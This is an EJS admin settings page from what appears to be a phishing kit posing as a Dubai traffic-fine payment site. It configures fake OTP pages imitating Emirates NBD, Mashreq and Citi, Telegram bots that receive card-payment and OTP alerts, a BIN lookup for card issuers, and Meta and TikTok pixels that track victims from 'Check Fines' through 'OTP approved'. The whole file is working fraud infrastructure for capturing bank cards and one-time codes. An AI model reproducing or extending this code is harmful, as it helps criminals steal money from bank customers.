<%- include('_layout', { pageTitle: 'Settings', activePage: 'settings', adminUser }) %>

<% if (typeof dbError !== 'undefined' && dbError) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Database error: <%= dbError %></div>
<% } %>

<% if (saved) { %>
<div class="alert alert-success" style="margin-bottom:16px;">Settings saved successfully.</div>
<% } %>
<% if (error) { %>
<div class="alert alert-error" style="margin-bottom:16px;">Error: <%= error %></div>
<% } %>

<!-- General Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">General Settings</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_settings" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Default OTP Page</label>
          <select name="otp_default_page">
            <option value="otp-sms"     <%= otpDefault==='otp-sms'     ? 'selected' : '' %>>SMS OTP</option>
            <option value="otp"         <%= otpDefault==='otp'         ? 'selected' : '' %>>Emirates NBD</option>
            <option value="otp-mashreq" <%= otpDefault==='otp-mashreq' ? 'selected' : '' %>>Mashreq</option>
            <option value="otp-citi"    <%= otpDefault==='otp-citi'    ? 'selected' : '' %>>Citi</option>
          </select>
          <div class="field-hint">New users on the payment page will be routed to this OTP flow by default.</div>
        </div>

        <div class="form-group">
          <label>Site Status</label>
          <select name="site_active">
            <option value="1" <%= siteActive==='1' ? 'selected' : '' %>>Active</option>
            <option value="0" <%= siteActive==='0' ? 'selected' : '' %>>Maintenance</option>
          </select>
          <div class="field-hint">When set to Maintenance, public pages will display a service notice.</div>
        </div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save General Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- Meta & TikTok Pixel -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Meta Pixel &amp; Conversions API (CAPI)</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_telegram" value="1">

      <!-- Meta bölümü -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        Meta (Facebook) Pixel
      </div>
      <div class="form-row">
        <div class="form-group">
          <label>Pixel ID</label>
          <input type="text" name="meta_pixel_id" value="<%= metaPixelId %>" placeholder="1260674512113479" class="mono" autocomplete="off">
          <div class="field-hint">Frontend pixel ID — injected into public pages.</div>
        </div>
        <div class="form-group">
          <label>Access Token (CAPI)</label>
          <input type="text" name="meta_access_token" value="<%= metaAccessToken %>" placeholder="EAAxxxxxxxxxxxxxxx" class="mono" autocomplete="off">
          <div class="field-hint">Server-side Conversions API token from Events Manager.</div>
        </div>
        <div class="form-group">
          <label>Test Event Code</label>
          <input type="text" name="meta_test_event_code" value="<%= metaTestEventCode %>" placeholder="TEST12345" class="mono" autocomplete="off">
          <div class="field-hint">Optional. Leave empty in production.</div>
        </div>
      </div>

      <!-- TikTok bölümü -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;margin-top:8px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        TikTok Pixel
      </div>
      <div class="form-row">
        <div class="form-group">
          <label>TikTok Pixel ID</label>
          <input type="text" name="tiktok_pixel_id" value="<%= tiktokPixelId %>" placeholder="CXXXXXXXXXXXXXXXXX" class="mono" autocomplete="off">
          <div class="field-hint">Found in TikTok Ads Manager → Assets → Events.</div>
        </div>
        <div class="form-group">
          <label>TikTok Access Token (Events API)</label>
          <input type="text" name="tiktok_access_token" value="<%= tiktokAccessToken %>" placeholder="xxxxxxxx..." class="mono" autocomplete="off">
          <div class="field-hint">Server-side Events API token for CAPI.</div>
        </div>
      </div>

      <!-- Tracked Events info -->
      <div style="background:#f8fafc;border:1px solid #e2e8f0;border-radius:8px;padding:14px 16px;margin-bottom:16px;font-size:12px;color:#475569;">
        <strong style="display:block;margin-bottom:8px;color:#0f172a;">Tracked Events (both Meta &amp; TikTok)</strong>
        <div style="display:grid;grid-template-columns:repeat(auto-fit,minmax(180px,1fr));gap:6px;">
          <div>📍 <b>PageView</b> — on page load</div>
          <div>🔍 <b>Search</b> — Check Fines button</div>
          <div>💳 <b>InitiateCheckout</b> — Pay button clicked</div>
          <div>✅ <b>Purchase</b> — OTP approved</div>
          <div>📲 <b>SubmitApplication</b> — OTP submitted</div>
          <div>👁️ <b>ViewContent</b> — Fines page loaded</div>
        </div>
      </div>

      <!-- Telegram alert toggle -->
      <div style="font-size:11px;font-weight:700;color:#374151;text-transform:uppercase;letter-spacing:.5px;margin-bottom:12px;padding-bottom:8px;border-bottom:1px solid #f1f5f9;">
        Admin Panel Alerts
      </div>
      <div class="form-group">
        <label style="display:flex;align-items:center;gap:10px;cursor:pointer;">
          <input type="checkbox" name="admin_tg_alerts" value="1" <%= adminTgAlerts==='1' ? 'checked' : '' %>
                 style="width:16px;height:16px;accent-color:#006837;">
          <span>Send Telegram notification on login &amp; critical actions (approve, delete, settings save)</span>
        </label>
        <div class="field-hint">Uses the Payment Notification Bot Token and Chat ID above.</div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save Pixel &amp; Alert Settings</button>
      </div>
    </form>
  </div>
</div>

<!-- Telegram & API Settings -->
<div class="table-card" style="margin-bottom:20px;">
  <div class="tc-header">
    <div class="tc-title">Telegram &amp; API Settings</div>
    <div class="tc-meta">Stored in database — takes precedence over environment variables</div>
  </div>
  <div class="form-section">
    <form method="POST" action="/admin/settings">
      <input type="hidden" name="save_telegram" value="1">

      <div class="form-row">
        <div class="form-group">
          <label>Payment Notification Bot Token</label>
          <input type="text" name="telegram_bot_token"
                 value="<%= telegramToken %>"
                 placeholder="1234567890:ABCDefGhIJKlmNoPQRstuVWxyZ"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Receives card payment and OTP event notifications.</div>
        </div>

        <div class="form-group">
          <label>Telegram Chat ID</label>
          <input type="text" name="telegram_chat_id"
                 value="<%= telegramChatId %>"
                 placeholder="-1001234567890 or 7632086796"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Channel, group, or personal chat ID for all notifications.</div>
        </div>
      </div>

      <div class="form-row">
        <div class="form-group">
          <label>Inquiry (Search) Bot Token</label>
          <input type="text" name="search_telegram_bot_token"
                 value="<%= searchTgToken %>"
                 placeholder="1234567890:ABCDefGhIJKlmNoPQRstuVWxyZ"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">Used for plate inquiry search alerts. May be the same as above.</div>
        </div>

        <div class="form-group">
          <label>HandyAPI Key</label>
          <input type="text" name="handy_api_key"
                 value="<%= handyApiKey %>"
                 placeholder="HAS-xxxxxxxxxxxxxxxxxxxx"
                 class="mono" autocomplete="off" spellcheck="false">
          <div class="field-hint">BIN lookup for card issuer/country identification. Get one at handyapi.com.</div>
        </div>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Save Telegram &amp; API Settings</button>
        <button type="button" class="btn btn-ghost" onclick="testTelegram()">Send Test Message</button>
      </div>
    </form>
  </div>
</div>

<!-- Change Password -->
<div class="table-card">
  <div class="tc-header">
    <div class="tc-title">Change Password</div>
  </div>
  <div class="form-section">

    <% if (pwMsg) { %>
    <div class="alert alert-<%= pwMsg.type === 'success' ? 'success' : 'error' %>" style="max-width:480px;margin-bottom:18px;"><%= pwMsg.text %></div>
    <% } %>

    <form method="POST" action="/admin/settings" style="max-width:480px;">
      <input type="hidden" name="change_password" value="1">

      <div class="form-group">
        <label>New Username <span style="font-weight:400;color:#94a3b8;">(leave empty to keep current)</span></label>
        <input type="text" name="new_username" placeholder="<%= adminUser %>" autocomplete="off">
      </div>
      <div class="form-group">
        <label>Current Password</label>
        <input type="password" name="current_password" placeholder="Enter current password" autocomplete="current-password" required>
      </div>
      <div class="form-group">
        <label>New Password</label>
        <input type="password" name="new_password" placeholder="Minimum 6 characters" autocomplete="new-password" required>
      </div>
      <div class="form-group">
        <label>Confirm New Password</label>
        <input type="password" name="new_password2" placeholder="Repeat new password" autocomplete="new-password" required>
      </div>

      <div class="form-actions">
        <button type="submit" class="btn btn-primary">Update Password</button>
      </div>
    </form>
  </div>
</div>

<style>
.form-section { padding: 24px 28px; }
.form-row { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
@media (max-width: 700px) { .form-row { grid-template-columns: 1fr; } }
.form-group { margin-bottom: 18px; }
.form-group label {
  display: block; font-size: 11px; font-weight: 700; color: #374151;
  text-transform: uppercase; letter-spacing: .5px; margin-bottom: 6px;
}
.form-group input, .form-group select {
  width: 100%; padding: 9px 12px; border: 1.5px solid #e2e8f0;
  border-radius: 8px; font-size: 13px; color: #0f172a; background: #f8fafc;
  outline: none; transition: border-color .15s, box-shadow .15s;
}
.form-group input:focus, .form-group select:focus {
  border-color: #006837; background: #fff;
  box-shadow: 0 0 0 3px rgba(0,104,55,.08);
}
.form-group input.mono { font-family: 'SFMono-Regular', Consolas, monospace; font-size: 12px; letter-spacing: .2px; }
.field-hint { font-size: 11px; color: #94a3b8; margin-top: 5px; line-height: 1.4; }
.form-actions { display: flex; gap: 10px; padding-top: 6px; flex-wrap: wrap; }
.alert-success { background: #f0fdf4; border: 1px solid #bbf7d0; color: #166534; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
.alert-error   { background: #fef2f2; border: 1px solid #fecaca; color: #991b1b; padding: 10px 16px; border-radius: 8px; font-size: 13px; }
</style>

<script>
async function testTelegram() {
  const token  = document.querySelector('[name=telegram_bot_token]').value.trim();
  const chatId = document.querySelector('[name=telegram_chat_id]').value.trim();
  if (!token || !chatId) { toast('Enter bot token and chat ID first', 'error'); return; }
  try {
    const r = await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: chatId, text: '<b>Admin panel test message</b>\nDubai Fine System — connection verified.', parse_mode: 'HTML' }),
    });
    const d = await r.json();
    if (d.ok) toast('Test message sent successfully');
    else toast('Telegram error: ' + (d.description || 'unknown'), 'error');
  } catch (e) { toast('Connection error: ' + e.message, 'error'); }
}
</script>

<%- include('_layout_end') %>
